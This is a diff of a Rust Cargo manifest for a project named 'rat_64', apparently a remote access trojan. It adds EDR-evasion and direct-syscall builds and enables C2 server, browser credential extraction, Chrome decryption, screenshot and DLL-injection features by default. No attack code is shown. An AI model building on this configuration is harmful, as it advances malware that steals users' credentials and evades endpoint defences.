@@ -11,30 +11,10 @@ readme = "README.md"
 members = [".", "chrome_decrypt"]
 resolver = "2"
 
+# release-tinyプロファイルのみ（後方互換性削除）
 [profile.release]
-opt-level = 3
-lto = "fat"
-codegen-units = 1
-panic = "abort"
-strip = "symbols"
-overflow-checks = false
-incremental = false
-debug = false
-rpath = false
-# 最適化強化
-split-debuginfo = "off"
-
-[profile.dev]
-opt-level = 1
-debug = true
-overflow-checks = true
-incremental = true
-debug-assertions = true
-
-[profile.release-tiny]
-inherits = "release"
 opt-level = "z"
-lto = "fat" 
+lto = "fat"
 codegen-units = 1
 panic = "abort"
 strip = "symbols"
@@ -42,8 +22,16 @@ debug = false
 rpath = false
 overflow-checks = false
 debug-assertions = false
-# 超小型化設定
+incremental = false
 split-debuginfo = "off"
+
+# devプロファイルも最適化
+[profile.dev]
+opt-level = 1
+debug = true
+overflow-checks = false
+incremental = false
+debug-assertions = false
 
 [lib]
 name = "rat_64"
@@ -60,6 +48,16 @@ path = "src/bin/c2_server.rs"
 [[bin]]
 name = "auth_extractor"
 path = "src/bin/auth_extractor.rs"
+
+[[bin]]
+name = "syscall_test"
+path = "src/bin/syscall_test.rs"
+
+[[bin]]
+name = "edr_evasion_test"
+path = "src/bin/edr_evasion_test.rs"
+
+
 
 [dependencies]
 serde = { version = "1.0", features = ["derive"] }
@@ -82,6 +80,11 @@ libloading = { version = "0.8", default-features = false }  # NSSで必要
 which = { version = "8.0.0", default-features = false, features = ["real-sys"] }  # NSSで必要
 dirs = { version = "6.0.0", default-features = false }  # ディレクトリ検索用
 
+# EDR回避テスト専用依存関係
+regex = { version = "1.10", default-features = false, features = ["std"], optional = true }
+hex = { version = "0.4", optional = true }
+once_cell = { version = "1.19", optional = true }
+
 # 条件付き依存関係（機能別）
 log = { version = "0.4", default-features = false, optional = true }  # ログ機能
 indicatif = { version = "0.18.0", default-features = false, features = ["unicode-width"], optional = true }  # プログレスバー
@@ -90,11 +93,12 @@ chrono = { version = "0.4", default-features = false, features = ["clock", "std"
 tokio = { version = "1.0", features = ["rt-multi-thread", "macros", "time", "sync", "signal", "net", "fs"] }  # async runtime（拡張版）  
 uuid = { version = "1.0", features = ["v4"] }  # UUID生成
 sysinfo = { version = "0.37.1", default-features = false }  # システム情報取得（ハートビート用）
-hmac = { version = "0.12", default-features = false }  # HMAC認証（リモートコマンド用）
-sha2 = { version = "0.10", default-features = false }  # SHA256ハッシュ（認証用）
 # 必須依存関係（最小化）
 tempfile = { version = "3.8", default-features = false }
 walkdir = { version = "2.3", default-features = false }
+
+# Workspace internal crate for Chrome decryption (Windows-only code)
+chrome_decrypt = { path = "chrome_decrypt" }
 
 # --- For local Hyper test server (bin: c2_server) ---
 hyper = { version = "1", features = ["server", "http1"] }
@@ -105,41 +109,21 @@ encoding_rs = "0.8.35"
 hostname = "0.4"  # ホスト名取得用
 num_cpus = "1.0"  # CPU情報取得用
 
-# ---- Feature設定（統一・最適化済み） ----
+# ---- 機能フラグ（後方互換性削除・最適化版） ----
 [features]
-# デフォルト設定（最小構成）
-default = ["full"]
+# デフォルトで全機能有効（単純化）
+default = ["network", "browser", "screenshot", "inject", "logging", "datetime", "server_diagnostics", "direct-syscall", "edr-testing"]
 
-core = []  # コア機能（常に有効）
-
-# 個別モジュール機能
-network = ["dep:minreq"]                                # ネットワーク通信（HTTP、ファイルアップロード）
-screenshot = ["dep:image", "dep:scrap"]                   # スクリーンショット機能
-browser = ["dep:rusqlite"]                                # ブラウザデータ取得機能
-
-# UI/UX機能
-progress-bar = ["dep:indicatif"]                          # プログレスバー表示
-logging = ["dep:log"]                                     # ログ機能
-datetime = []                                            # 日時処理（常に有効）
-
-# サイズ最適化用機能フラグ
-ui-minimal = []                                           # UI要素を最小化（progress-bar除外）
-crypto-minimal = []                                       # 暗号化機能を最小化
-size-optimized = ["ui-minimal", "crypto-minimal"]        # 総合サイズ最適化
-
-# サーバー診断エンドポイント（任意）
-# 有効化時のみ /api/health, /api/network, /api/sysinfo を提供
-server_diagnostics = []
-
-# 重複削除：database = browserのエイリアスは不要
-
-# 機能グループ（段階的構成）
-basic = ["core", "browser"]
-extended = ["basic", "screenshot", "progress-bar"]
-full = ["extended", "network", "logging", "inject"]
-
-# 特殊機能
-inject = ["dep:clap"]  # DLLインジェクション機能
+# 主要機能（個別無効化可能）
+network = ["dep:minreq"]                    # ネットワーク通信
+browser = ["dep:rusqlite"]                  # ブラウザデータ取得
+screenshot = ["dep:image", "dep:scrap"]     # スクリーンショット
+inject = ["dep:clap"]                       # DLLインジェクション
+logging = ["dep:log"]                       # ログ機能（最小化対応）
+datetime = []                               # 日時処理機能
+server_diagnostics = []                     # サーバー診断エンドポイント
+direct-syscall = []                         # Direct Syscall機能（デフォルト有効）
+edr-testing = ["dep:regex", "dep:hex", "dep:once_cell"]  # EDR回避テスト機能
 
 # optional deps（必要時だけ読み込む）
 [dependencies.minreq]
@@ -164,7 +148,7 @@ optional = true
 version = "0.5"
 optional = true
 
-# Windows API（必要最小限のモジュール）
+# Windows API（EDRテスト用拡張モジュール）
 [target.'cfg(windows)'.dependencies]
 windows = { version = "0.62.0", default-features = false, features = [
   "Win32_Foundation",
@@ -183,9 +167,29 @@ windows = { version = "0.62.0", default-features = false, features = [
   "Win32_UI_WindowsAndMessaging",
   "Win32_System_LibraryLoader",
   "Win32_System_SystemInformation",
-  "Win32_Storage_FileSystem",
+  "Win32_Storage_FileSystem",  
   "Win32_System_Time",
   "Win32_NetworkManagement_IpHelper",
   "Win32_NetworkManagement_Ndis",
   "Win32_Networking_WinSock",
+  "Win32_System_Registry",
+  "Win32_System_ProcessStatus",
+  "Win32_System_Kernel",
+  "Win32_System_Environment",
+  "Win32_Security",
+  "Win32_System_Console",
+  "Win32_System_Pipes",
+  "Win32_System_WindowsProgramming",
+  "Win32_System_Diagnostics_ToolHelp",
+  "Win32_System_Diagnostics_ProcessSnapshotting",
+  "Win32_NetworkManagement_NetManagement",
+  "Win32_Storage_InstallableFileSystems",
+  "Win32_System_Services",
+  "Win32_System_Power",
+  "Win32_System_Hypervisor",
+  "Win32_Security_Authentication_Identity",
+  "Win32_Security_Authorization",
+  "Win32_UI_Controls",
+  "Win32_Graphics_Gdi",
+  "Win32_System_Ioctl",
 ] }
